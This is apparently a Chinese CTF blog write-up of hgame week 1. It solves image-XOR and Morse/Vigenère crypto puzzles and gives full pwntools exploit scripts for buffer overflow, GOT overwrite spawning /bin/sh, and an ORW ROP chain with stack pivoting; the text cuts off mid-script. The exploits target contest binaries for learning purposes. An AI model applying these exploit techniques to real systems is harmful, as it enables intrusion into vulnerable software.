    <content type="html"><![CDATA[<p>复现hgame</p><span id="more"></span><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h3><p>题目：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#生成图像吧</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="comment">#写像素</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line">n1 = makeSourceImg()</span><br><span class="line">n2 = makeSourceImg()</span><br><span class="line">n3 = makeSourceImg()</span><br><span class="line">nonce = [n1, n2, n3]    <span class="comment">#三张图片</span></span><br><span class="line"></span><br><span class="line">index = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">16</span>)) <span class="comment">#生成0~16的序列</span></span><br><span class="line">shuffle(index)  <span class="comment"># 打乱序列</span></span><br><span class="line">e=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">f&quot;source/picture<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">    key = nonce[randint(<span class="number">0</span>, <span class="number">2</span>)]</span><br><span class="line">    encImg = xorImg(key, im)</span><br><span class="line">    encImg.save(<span class="string">f&#x27;pics/enc<span class="subst">&#123;e&#125;</span>.png&#x27;</span>)</span><br><span class="line">    e+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行</p><p>最后解密代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> shuffle, randint, getrandbits</span><br><span class="line"></span><br><span class="line">flagImg = Image.<span class="built_in">open</span>(<span class="string">f&#x27;pics/enc<span class="subst">&#123;<span class="number">0</span>&#125;</span>.png&#x27;</span>)</span><br><span class="line">width = flagImg.width</span><br><span class="line">height = flagImg.height</span><br><span class="line">flagImg.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xorImg</span>(<span class="params">keyImg, sourceImg</span>):</span><br><span class="line">    <span class="comment"># 生成图片</span></span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height)) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i))</span><br><span class="line">            img.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        imi = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        imj = Image.<span class="built_in">open</span>(<span class="string">f&quot;pics/enc<span class="subst">&#123;j&#125;</span>.png&quot;</span>)</span><br><span class="line">        xorimg = xorImg(imj, imi)</span><br><span class="line">        xorimg.save(<span class="string">f&#x27;source/xor<span class="subst">&#123;i*<span class="number">16</span>+j&#125;</span>.png&#x27;</span>)</span><br><span class="line">        imi.close()</span><br><span class="line">        imj.close()</span><br></pre></td></tr></table></figure><p>最后获得模糊的flag图片：</p><p><img data-src="/./../images/xor246.png" alt="xor246"></p><h3 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h3><p>题目：</p><p>一个疑似base64编码的txt文件</p><p>一个播放起来是一个摩斯密码的wav文件</p><p>解法：</p><ol><li><p>提取出声音文件的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">morse2ascii morse.wav</span><br></pre></td></tr></table></figure><p><img data-src="/./../images/image-20230114103532078.png" alt="image-20230114103532078"></p></li><li><p>base64解码：</p></li></ol><p><img data-src="/./../images/image-20230114103642721.png" alt="image-20230114103642721"></p><p>篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar</p><p>（这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行）</p><p>最后flag:</p><p><img data-src="/./../images/image-20230114104040525.png" alt="image-20230114104040525"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来</p><p>题目没啥好讲的，直接上exp</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">back_addr = elf.sym[<span class="string">&#x27;b4ckd0or&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0</span>) + p64(back_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>运用1&gt;&amp;2将结果从报错信息中输出</p><p><img data-src="/./../images/image-20230114110109416.png" alt="image-20230114110109416"></p><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>**HINTS:**数组下标的检查好像少了点东西</p><p>下标v0没有检查下界</p><p><img data-src="/./../images/image-20230114151906912.png" alt="image-20230114151906912"></p><p>seats在bss段，并只有seats写入。无法进行栈操作<img data-src="/./../images/image-20230114152100537.png" alt="image-20230114152100537"></p><p>思路：运用负下标进行got表覆盖，用got表泄漏libc的地址</p><ol><li>先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用</li><li>再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址</li><li>用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了</li></ol><p>exp：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30536)</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line">elf = ELF(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sys_libc = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_setbuf_addr = libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;setbuf:&#x27;</span>,<span class="built_in">hex</span>(libc_setbuf_addr))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">6</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,p64(vuln_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;vuln&quot;</span>,vuln_addr)</span><br><span class="line">b()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">setbuf_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(setbuf_addr))</span><br><span class="line"></span><br><span class="line">base_addr = setbuf_addr - libc_setbuf_addr</span><br><span class="line">sys_addr = base_addr + sys_libc</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr</p><p>下面把d0换成41就行，41就是我们写进去的’A’</p><p><img data-src="/./../images/image-20230114153844803.png" alt="image-20230114153844803"></p><p>如何这里减去总值：</p><p><img data-src="/./../images/image-20230114153925669.png" alt="image-20230114153925669"></p><p>这里还有一种做法就是写入\xd0,就是让地址不发生变化，这样计算基地址直接减去sym中找的地址就行，其实这种做法也就方便了一点点</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name is &#x27;</span>)</span><br><span class="line">setbuf_addr = u64(io.recvuntil(<span class="string">&#x27;Your seat&#x27;</span>).split(<span class="string">b&#x27;\nYour&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(setbuf_addr))</span><br></pre></td></tr></table></figure><p>binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了</p><p><img data-src="/./../images/image-20230114153109502.png" alt="image-20230114153109502"></p><p>这里有两种做法，一种是从-9这个下标写入binsh的字符串和system的地址，让程序调用puts间接调用sytem函数</p><p>第二种做法就是用one_gadget查找libc中，执行binsh的指令</p><p><img data-src="/./../images/image-20230116195715458.png" alt="image-20230116195715458"></p><p>这里其实条件比较苛刻，要求一些寄存器中的地址对应的内容为null，这里存在偶然性，不过也是可以的</p><p>所以我们采用第一种方法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">b&#x27;one.&#x27;</span>,<span class="built_in">str</span>(-<span class="number">9</span>))</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(sys_addr)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;your name&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>这里我们可以先打开tmux终端，在tmux运行exp，前提是exp设置了context.terminal &#x3D; [“tmux”,”splitw”,”-h”]，然后进行gdb.attch</p><p>这里方便起见我们可以设置一个调试函数，方便exp运行时临时调试程序</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br></pre></td></tr></table></figure><p>将这个函数放置到我们想调试的地方</p><p>效果：</p><p><img data-src="/./../images/image-20230116200235063.png" alt="image-20230116200235063"></p><p>然后再gdb先后输入got一一&gt;p&#x2F;x *(地址),就可以查看某个got中的内容了</p><p><img data-src="/./../images/image-20230116200809156.png" alt="image-20230116200809156"></p><p><img data-src="/./../images/image-20230116200845999.png" alt="image-20230116200845999"></p><p>这里吐槽一下，其实gdb新版本可以直接看到got表的内容，我这个gdb已经是ubuntu20.02的最高版本了，我这个docker就不折腾了</p><p>（PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程）</p><p>结果：</p><p><img data-src="/./../images/image-20230116201152048.png" alt="image-20230116201152048"></p><h3 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h3><p><strong>CTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell，这时候需要通过调用open、read、write这样的函数打开flag，存到内存中，再输出</strong></p><p>将三个函数开头字母作为简称，也就是orw</p><p>可以通过<a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>来判断是否添加沙箱，以及查看沙箱的规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure><p>像这样就是比较经典的只允许64位的read、write、open三个系统调用，其他的系统调用号都被禁止</p><p>这里需要用到栈迁移</p><p>栈迁移的本质就是控制rsp和rbp，将栈帧转移到我们想要的位置，这里需要执行两次leave;return。</p><p>leave&#x3D;mov rsp,rbp;pop rbp所以第一次不能将rsp进行改变</p><p>第一次是将rbp转移，第二次是将rsp转移。</p><p>栈迁移条件：</p><ol><li>存在 <strong>leave ret</strong> 这类gadget指令</li><li>存在可执行shellcode的内存区域</li></ol><p>链接：<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com)</a></p><p>这里说明一下：open拿到的只是文件句柄，里面没有文件内容，要读文件内容还是要执行read，read的参数就要求文件句柄，read的功能就是将硬盘文件内容读到内存中的某一块缓冲区中，然后write负责将缓冲区中的内容写进屏幕中</p><p>题目中溢出长度为0x30,那注入地址为0x30&#x2F;0x8&#x3D;6,就6条显然不能构成rop链</p><p>进行栈迁移，由于我没做过栈迁移的题，这里详细写一下</p><p>第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址,rbp放到bss+0x200，这个地址其实是程序地址之外的空间了，所以拿来当作新栈对程序不产生影响</p><p><img data-src="/./../images/image-20230115211905558.png" alt="image-20230115211905558"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br></pre></td></tr></table></figure><p>计算基地址，算出orw三个函数的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">success(<span class="string">&#x27;puts:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base_addr = puts_addr - libc_puts</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>] + base_addr</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>] + base_addr</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>] + base_addr</span><br></pre></td></tr></table></figure><p>第二次溢出，将rbp放置到新栈</p><p><img data-src="/./../images/image-20230115212222119.png" alt="image-20230115212222119"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(bss + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(vuln_addr + <span class="number">0x0F</span>)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><p>执行完第二次溢出后，rsp在旧栈位置，rbp在新栈位置，为了让rbp在新栈位置不发生移动，这里我们直接将之后的函数直接定位到read函数上，+0xf，因为read函数之前有对rbp和rsp进行操作</p><p>第三次溢出，将进行两次leave；ret，这样rsp就将锁定在新栈的栈顶位置，因为ret主要是靠rsp来控制程序流，rbp只是拿来定位局部变量</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">payload2 = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>) <span class="comment">#这里就是新rbp-0x100的地方，也就是刚写&#x27;/flag\x00\x00\x00&#x27;的地址</span></span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x3</span>) </span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)   <span class="comment"># 可能是指定缓冲区地址</span></span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(read_addr)</span><br><span class="line"></span><br><span class="line">payload2 += p64(pop_rdi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x1</span>)</span><br><span class="line">payload2 += p64(pop_rsi_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x404711</span>)</span><br><span class="line">payload2 += p64(pop_rdx_ret)</span><br><span class="line">payload2 += p64(<span class="number">0x100</span>)</span><br><span class="line">payload2 += p64(write_addr)</span><br><span class="line"></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload2 += p64(<span class="number">0x404160</span>)   <span class="comment"># 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去</span></span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br></pre></td></tr></table></figure><p>所以第三次的rbp最终位置不用去管它，rbp的任务就是让rsp锁定到新栈栈顶位置就行</p><p>这里read和write都需要三个参数，64位，函数从左到右寄存器分别是rdi,rsi,rdx</p><p>通过pop ret指令来控制rsp从而控制程序流</p><p>以上就是栈迁移的详细内容</p><p>完整代码：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;week-1.hgame.lwsec.cn&#x27;</span>,<span class="number">31266</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal =  [<span class="string">&quot;konsole&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line">vuln_addr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">libc_puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x4012be</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0401393</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x100</span> + p64(bss+<span class="number">0x200</span>)</span><br><span class="line">payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;task.\n&#x27;</span>,payload1)</span><br><span 